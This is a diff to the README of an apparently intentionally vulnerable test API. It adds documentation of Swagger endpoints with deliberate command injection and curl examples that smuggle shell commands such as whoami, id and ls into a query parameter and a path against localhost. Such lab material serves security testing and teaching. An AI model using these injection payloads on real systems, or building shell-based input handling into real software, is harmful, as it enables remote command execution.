@@ -139,6 +139,34 @@ The API has intentionally vulnerable endpoints that allow command injection thro
 - `GET /api/{version}/version-info` - Version validation with command injection
 - `GET /api/{version}/check` - API version check with command injection
 
+### Swagger UI RCE Vulnerability
+
+The API exposes Swagger/OpenAPI documentation endpoints with RCE vulnerabilities through unsafe spec generation:
+
+- `GET /swagger` - Main Swagger UI endpoint
+- `GET /swagger.json` - Swagger JSON spec
+- `GET /api-docs` - API documentation
+- `GET /swagger/generate?title={value}` - Generate custom spec (vulnerable to command injection)
+- `GET /swagger/upload/{spec}` - Upload custom spec (vulnerable to command injection)
+
+**Exploitation Examples:**
+
+```bash
+# Execute whoami command via query parameter
+curl http://localhost:7341/swagger/generate?title=\$\(whoami\)
+
+# Execute id command
+curl http://localhost:7341/swagger/generate?title=API\;id\;
+
+# Execute commands via upload endpoint
+curl http://localhost:7341/swagger/upload/test\;whoami\;
+
+# Chain multiple commands
+curl "http://localhost:7341/swagger/generate?title=API\;ls%20-la\;pwd"
+```
+
+The vulnerability exists because the endpoints use shell commands to "validate" user input during spec generation.
+
 ## Testing
 
 Run the test suite:
